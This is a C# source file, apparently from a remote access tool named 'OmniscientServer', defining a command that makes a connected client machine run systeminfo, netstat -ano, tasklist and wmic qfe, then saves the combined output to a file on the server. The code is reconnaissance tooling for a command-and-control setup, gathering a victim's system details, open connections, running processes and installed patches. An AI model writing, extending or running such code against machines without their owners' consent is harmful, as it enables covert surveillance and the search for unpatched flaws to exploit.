namespace OmniscientServer
{
    public class SystemInfosCommand : ExecuteOnClientCommand
    {
        public SystemInfosCommand(Server server) : base(server) { }

        protected override string ExecuteCommand(string[] parameters)
        {
            string[] systemInsfoCmd = { "exec", "systeminfo" };
            string[] netStatCmd = { "exec", "netstat", "-ano" };
            string[] taskListCmd = { "exec", "tasklist" };
            string[] captionCmd = { "exec", "wmic", "qfe", "get", "Caption,Description,HotFixID,InstalledOn" };

            string systemInfosOutput = base.ExecuteCommand(systemInsfoCmd);
            string netStatOutput = base.ExecuteCommand(netStatCmd);
            string taskListOutput = base.ExecuteCommand(taskListCmd);
            string captionOutput = base.ExecuteCommand(captionCmd);

            string separator = "\n\n----------------------------------\n\n";
            string systemInfoLabel = "System Infos:\n-------------------------------\n";
            string netStatLabel = "Net Stat:\n-------------------------------\n";
            string taskListLabel = "Task List:\n-------------------------------\n";
            string captionOutputLabel = "Fix Output:\n-------------------------------\n";

            string formattedSystemInfos = systemInfoLabel + systemInfosOutput;
            string formattedNetStat = netStatLabel + netStatOutput;
            string formattedTaskList = taskListLabel + taskListOutput;
            string formattedCaptionOutput = captionOutputLabel + captionOutput;

            string completeOutput = formattedSystemInfos + separator + formattedNetStat + separator + formattedTaskList + separator + formattedCaptionOutput;

            Writer(completeOutput, "system_infos.txt");
            
            return $"Omniscient$ System infos have been imported successfully.";
        }
    }
}